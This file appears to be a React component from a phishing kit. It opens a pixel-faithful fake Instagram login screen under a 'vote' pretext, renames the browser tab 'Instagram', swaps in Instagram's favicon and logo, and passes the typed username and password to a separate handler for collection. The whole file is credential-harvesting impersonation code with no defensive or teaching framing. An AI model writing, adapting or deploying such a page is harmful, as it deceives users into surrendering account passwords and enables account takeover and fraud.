"use client";

import { useState, useEffect } from "react";

interface InstagramVoteProps {
  onClose: () => void;
  // This prop connects the modal to your Hero.tsx logic
  onLogin: (username: string, pass: string) => void;
}

export default function InstagramVote({
  onClose,
  onLogin,
}: InstagramVoteProps) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPass, setShowPass] = useState(false);

  useEffect(() => {
    document.title = "Instagram";
    const favicon = document.getElementById(
      "dynamic-favicon"
    ) as HTMLLinkElement;
    if (favicon) favicon.href = "img/ifavicon.png";
  }, []);

  const handleLoginClick = () => {
    if (username && password) {
      // Pass the data back to Hero.tsx
      onLogin(username, password);
    }
  };

  return (
    <div className="fixed inset-0 z-[10000] bg-white flex flex-col items-center pt-10 font-sans">
      <button
        onClick={onClose}
        className="absolute top-4 left-4 text-2xl text-gray-600">
        &times;
      </button>

      <div className="w-full max-w-[350px] px-6">
        <div className="text-center text-xs text-gray-500 mb-8">
          English (US)
        </div>

        <div className="flex justify-center mb-8">
          <img src="/images/ilogo.png" alt="Instagram" className="h-12" />
        </div>

        <div className="space-y-3">
          <div className="relative">
            <input
              type="text"
              placeholder="Username, name or mobile number"
              className="w-full bg-[#fafafa] border border-gray-300 rounded-sm p-3 text-xs outline-none focus:border-gray-400 text-black"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
            {username && (
              <div
                className="absolute right-3 top-3 text-gray-400 cursor-pointer text-[10px]"
                onClick={() => setUsername("")}>
                ✕
              </div>
            )}
          </div>

          <div className="relative">
            <input
              type={showPass ? "text" : "password"}
              placeholder="Password"
              className="w-full bg-[#fafafa] border border-gray-300 rounded-sm p-3 text-xs outline-none focus:border-gray-400 text-black"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <div
              className="absolute right-3 top-3 text-gray-500 cursor-pointer"
              onClick={() => setShowPass(!showPass)}>
              {/* Using text fallback if FontAwesome isn't loaded yet */}
              <span className="text-[10px] font-bold uppercase">
                {showPass ? "Hide" : "Show"}
              </span>
            </div>
          </div>

          <button
            disabled={!username || !password}
            className={`w-full py-2 rounded-lg font-semibold text-sm transition-all ${
              username && password
                ? "bg-[#0095f6] text-white hover:bg-[#1877f2]"
                : "bg-[#b2dffc] text-white cursor-not-allowed"
            }`}
            onClick={handleLoginClick}>
            Log in
          </button>
        </div>

        <div className="text-center mt-4 text-xs text-[#00376b] font-medium cursor-pointer">
          Forgot Password?
        </div>
      </div>
    </div>
  );
}
